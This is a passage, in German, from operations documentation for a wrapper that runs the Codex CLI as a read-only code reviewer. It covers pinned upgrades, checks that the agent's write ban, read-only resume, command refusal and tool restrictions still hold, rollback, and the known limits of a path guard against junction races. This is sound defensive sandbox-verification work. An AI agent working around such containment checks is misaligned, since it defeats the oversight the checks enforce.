mit Spec und Diff in **einer** Eingabedatei (Fallbacks sehen nur Inline-Text). E2E getestet
27.08.2026: toter Provider übersprungen, das Ersatzmodell fand die gesäte SQL-Injection und
fehlende Plan-Schritte (`DOD: INCOMPLETE | SECURITY: FAIL`, 3 Befunde).

---

## 8. Codex heben — Vorgang mit Nachmessung

Jede Garantie des Wrappers ist eine Messung gegen eine bestimmte CLI-Version
(`MEASURED_CODEX_CLI` = `0.156.0`, dieselbe Zahl steht in genau einer markierten Zeile
des Modul-Docstrings). Die CLI hebt sich nicht selbst, und sie wird **nie** ungepinnt gehoben:

```bash
npm install -g @openai/codex@0.156.0
```

(mit der neuen, benannten Version statt der Messversion). Danach zwei Stufen:

**Stufe 1 — Preflight, mit dem bisherigen Wrapper, bevor Code geändert wird.** Nur Rohbelege
zählen (Antwortdatei, Ereignisstrom, stderr, Dateisystem):

1. Das Rollenmodell wird angenommen (kein HTTP 400).
2. Die Shell steht zur Verfügung: ≥ 1 `command_execution` mit ganzzahligem `exit_code` im Strom.
3. Das Schreibverbot hält: ein Schreibversuch scheitert, die Datei fehlt, der Arbeitsbaum ist sauber.
4. Resume bleibt read-only (derselbe Schreibversuch in einer Resume-Runde).
5. Eine **echte** Plan-Review-Runde bleibt unter dem Timeout (am 30.09.2026: ≈ 4:48 min).
6. Die Blind-Probe: ein eigenes `CODEX_HOME` **ohne** `[windows]`-Abschnitt (Anmeldung dort nur
   per `codex login`, nie `auth.json` kopieren; danach `codex logout` und löschen) — jeder Befehl
   muss abgewiesen werden, und festgehalten wird, wo die Ablehnung steht (am 30.09.2026: nur in
   stderr, im Strom kein `command_execution`).

Ein Exit 3 des bisherigen Wrappers bei nachweisbar ausgeführten Befehlen ist der bekannte
Fehlalarm von 2.5 und kein Preflight-Fehler. **Scheitert etwas, wird zurückgesetzt**:
`npm install -g @openai/codex@<bisherige Version>`, `codex --version` prüfen, ein Ping über den
Wrapper mit dem bisherigen Modell. Scheitert der Rückbau, läuft kein Review, bis entschieden ist.

**Stufe 2 — Abnahme, mit dem neuen Wrapper, vor dem Commit:** die Kopfzeile meldet die neue
Version ohne Warnung · J1 zählt ≥ 1 ausgeführten Befehl · Schreibverbot hält · Exit 3 auf der
Blind-Fixture (`tests/fixtures/codex-0.156/`) · `MODEL_MIN_CLI` verweigert gegen ein Fake-Binary
mit alter Version · das Werkzeug-Inventar eines Laufs (Haupt-Lauf **und** ein Sub-Agent) enthält
kein Web-, App-, Plugin- oder MCP-Werkzeug · die `AGENTS.md` des Repos erreicht den Prüfer
weiterhin · `codex features list` enthält kein stable-`true`-Feature außerhalb der beiden
Tabellen in §3. Erst dann wird `MEASURED_CODEX_CLI` angehoben.

**Nach dem Commit: Kopien zuerst, dann das Plugin.** Das Heben der Kopien braucht seit 2.6.0
`--private-root <ordner>` — den Ordner, von dem du bestätigst, dass nur du darunter
schreibst:

```bash
python <plugin>/scripts/wrapper_drift.py --scan <projektordner> --update --private-root <projektordner>
```

`<projektordner>` ist hier der Ordner, **unter** dem die Repos liegen: `--scan` sucht eine und
zwei Ebenen darunter. Ein einzelnes Repo nennt man mit `--repo <pfad>` (und derselben
`--private-root`).

⚠️ **Was `--private-root` zusichert, ist eng.** Das Werkzeug prüft den Ordner so, wie er
eingegeben ist (absolut, keine Steuerzeichen, kein UNC-/Gerätepfad, keine Laufwerkswurzel, kein
Netzlaufwerk, keine Junction in ihm oder darüber) und schreibt nur darunter. Windows-ACLs prüft
es **nicht**: der Schutz gilt, solange deine Bestätigung stimmt. Zwischen jeder Prüfung und dem
nächsten Dateisystemaufruf bleibt ein Fenster (`dir_fd` gibt es unter Windows nicht); wird der
Ordner genau dort zur Junction, kann eine **leere** Staging-Datei außerhalb entstehen (sie wird
über denselben Pfad wieder entfernt, wenn er noch erreichbar ist); wird er unmittelbar vor dem
Ersetzen zur Junction, kann die **fertige Kopie** außerhalb landen. Gegen einen gleichzeitig
laufenden Angreifer mit Schreibrecht unter dem Ordner schützt das nicht — gegen eine schon
vorhandene Junction schon. `--scripts-dir` ist zusammen mit `--update` verboten: eine Kopie
entsteht nur aus dem installierten Plugin.

**Zeilenenden zählen nicht als Drift (T17, 30.09.2026).** Git for Windows setzt systemweit
`core.autocrlf=true`; ohne `.gitattributes` lag dieselbe Datei im Plugin-Cache mit CRLF, in der
Arbeitskopie mal so, mal so, und im Projekt-Repo nach dem nächsten Checkout wieder anders — und
`wrapper_drift.py` verglich rohe Bytes: 26 identische Kopien standen als `DRIFT` da. Seitdem an
beiden Enden: das Plugin-Repo trägt `* text=auto eol=lf` (jeder Checkout, auch die Installation,
ist LF), und `wrapper_drift.py` vergleicht und schreibt die kanonische Form (`\r\n` → `\n`, ein
einzelnes `\r` bleibt ein Unterschied). Die Prüfung des Geschriebenen bleibt byte-genau. Auch
Python im Textmodus (`write_text()` ohne `newline=`) schreibt auf Windows CRLF — gemessen beim
Bau von T17; wer den Bash-Shim `hooks/claudex-python.sh` anfasst, prüft ihn danach
(`tests/test_line_endings.py` tut es).

**Wie Codex gestartet wird (2.6.0).** Unter Windows nie über `codex.cmd`: eine Batch-Datei
läuft über `cmd.exe`, das die Argumente noch einmal auswertet. Der Wrapper startet stattdessen
`node.exe` (neben dem npm-Starter, sonst aus dem PATH) mit
`node_modules/@openai/codex/bin/codex.js` — genau das, was der Starter tut, ohne `cmd.exe` —,
sonst eine `codex.exe` aus dem PATH, sonst die App-Kopie. Eine Batch-Datei wird nie gestartet
(Exit 127). Gemessen am 30.09.2026: der Lauf über `node.exe` + `codex.js` antwortet normal.

**Was die Versionsprobe nicht beweist.** Der Wrapper startet für die Versionsprobe und für den
Lauf dieselbe Startliste — unter Windows zwei Dateien, `node.exe` und `codex.js`. Dass
dazwischen keine der beiden ersetzt wurde, beweist das nicht; ein Ersatz einer oder beider
durch denselben Benutzer zwischen den zwei Starts ist ausdrücklich nicht abgedeckt.

